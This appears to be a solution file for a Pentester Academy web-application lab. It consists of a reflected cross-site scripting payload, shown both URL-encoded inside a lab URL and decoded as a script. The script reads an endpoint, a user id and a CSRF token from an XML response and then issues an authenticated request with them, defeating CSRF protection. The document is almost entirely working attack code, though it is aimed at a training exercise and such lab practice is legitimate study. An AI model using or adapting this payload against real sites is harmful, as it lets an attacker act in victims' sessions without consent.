// http://pentesteracademylab.appspot.com/lab/webapp/jfp/21
// http://pentesteracademylab.appspot.com/lab/webapp/jfp/21?url=%3Cscript%3E%0A%20%20var%20r1%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20r1.onreadystatechange%20%3D%20function()%20%7B%0A%20%20%20%20if%20(r1.readyState%20%3D%3D%3D%204%20%26%26%20r1.status%20%3D%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20var%20endpoint%20%3D%20r1.responseXML.getElementsByTagName(%27endpoint%27)%5B0%5D.firstChild.nodeValue%3B%0A%20%20%20%20%20%20var%20uid%20%3D%20r1.responseXML.getElementsByTagName(%27uid-param-value%27)%5B0%5D.firstChild.nodeValue%3B%0A%20%20%20%20%20%20var%20csrf_token%20%3D%20r1.responseXML.getElementsByTagName(%27token-param-value%27)%5B0%5D.firstChild.nodeValue%3B%0A%20%20%20%20%20%20var%20r2%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20%20%20%20%20var%20url%20%3D%20endpoint%20%2B%20%22%3Fuid%3D%22%20%2B%20uid%20%2B%20%22%26token%3D%22%20%2B%20csrf_token%3B%0A%20%20%20%20%20%20r2.open(%27GET%27%2C%20url)%3B%0A%20%20%20%20%20%20r2.onreadystatechange%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20if%20(r2.readyState%20%3D%3D%3D%204%20%26%26%20r2.status%20%3D%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20result%20%3D%20document.getElementById(%22result%22).innerHTML%20%3D%20r2.responseText%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20r2.send()%3B%0A%20%20%20%20%7D%0A%20%20%7D%0A%20%20r1.open(%27GET%27%2C%20%27%2Flab%2Fwebapp%2Fjfp%2F21%2Fgetxml%27)%3B%0A%20%20r1.send()%3B%0A%3C%2Fscript%3E

<script>
  var r1 = new XMLHttpRequest();
  r1.onreadystatechange = function() {
    if (r1.readyState === 4 && r1.status === 200) {
      var endpoint = r1.responseXML.getElementsByTagName('endpoint')[0].firstChild.nodeValue;
      var uid = r1.responseXML.getElementsByTagName('uid-param-value')[0].firstChild.nodeValue;
      var csrf_token = r1.responseXML.getElementsByTagName('token-param-value')[0].firstChild.nodeValue;
      var r2 = new XMLHttpRequest();
      var url = endpoint + "?uid=" + uid + "&token=" + csrf_token;
      r2.open('GET', url);
      r2.onreadystatechange = function() {
        if (r2.readyState === 4 && r2.status === 200) {
          var result = document.getElementById("result").innerHTML = r2.responseText;
        }
      }
      r2.send();
    }
  }
  r1.open('GET', '/lab/webapp/jfp/21/getxml');
  r1.send();
</script>
